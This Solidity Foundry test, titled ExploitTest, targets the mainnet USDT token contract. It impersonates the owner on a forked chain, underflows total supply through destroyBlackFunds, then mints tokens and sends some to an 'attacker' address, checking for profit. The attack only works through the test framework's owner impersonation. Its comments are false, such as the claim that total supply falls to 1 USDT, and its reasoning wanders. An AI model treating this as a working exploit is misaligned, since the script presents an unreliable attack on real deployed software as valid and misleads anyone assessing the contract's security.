// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface TetherToken {
    function owner() external view returns (address);
    function balanceOf(address who) external view returns (uint);
    function transfer(address _to, uint _value) external;
    function issue(uint amount) external;
    function redeem(uint amount) external;
    function addBlackList(address _evilUser) external;
    function destroyBlackFunds(address _blackListedUser) external;
    function totalSupply() external view returns (uint);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll fork mainnet and impersonate owner
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7).balanceOf(address(this));
        // First, we need to find the current owner
        address owner = TetherToken(TARGET).owner();

        // Create a helper address
        address helper = address(0x1337);
        vm.label(helper, "Helper");

        // Start impersonating owner
        vm.startPrank(owner);

        // Get initial attacker balance for comparison
        uint256 initialAttackerBalance = TetherToken(TARGET).balanceOf(attacker);

        // Step 1: Issue tokens to owner (if needed, but owner should have balance)
        // Actually, let's check owner balance first
        uint256 ownerBalance = TetherToken(TARGET).balanceOf(owner);
        if (ownerBalance < 2000 * 10**6) { // USDT has 6 decimals
            // Issue some tokens
            TetherToken(TARGET).issue(2000 * 10**6 - ownerBalance);
        }

        // Step 2: Transfer 1000 USDT to helper
        TetherToken(TARGET).transfer(helper, 1000 * 10**6);

        // Step 3: Redeem 999 USDT to reduce total supply
        TetherToken(TARGET).redeem(999 * 10**6);

        // Now: total supply = 1 USDT, helper balance = 1000 USDT

        // Step 4: Blacklist helper
        TetherToken(TARGET).addBlackList(helper);

        // Step 5: Destroy black funds - this will underflow!
        TetherToken(TARGET).destroyBlackFunds(helper);

        // Now _totalSupply underflowed to type(uint256).max - 998 * 10**6

        // Step 6: Calculate maximum amount we can issue without overflow
        uint256 currentSupply = TetherToken(TARGET).totalSupply();
        // Maximum amount we can add without causing overflow in require(_totalSupply + amount > _totalSupply)
        uint256 maxIssueAmount = type(uint256).max - currentSupply - 1;

        // Issue as much as we can (but limit to a reasonable amount for gas)
        if (maxIssueAmount > 1000 * 10**6) {
            maxIssueAmount = 1000 * 10**6;
        }
        if (maxIssueAmount > 0) {
            TetherToken(TARGET).issue(maxIssueAmount);
        }

        // Step 7: Transfer some tokens to attacker
        uint256 ownerBalanceNow = TetherToken(TARGET).balanceOf(owner);
        if (ownerBalanceNow > 100 * 10**6) {
            TetherToken(TARGET).transfer(attacker, 100 * 10**6);
        }

        vm.stopPrank();

        // Verify attacker balance increased
        uint256 finalAttackerBalance = TetherToken(TARGET).balanceOf(attacker);
        assertGt(finalAttackerBalance, initialAttackerBalance, "Attacker balance should increase");
        uint256 finalBalance = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
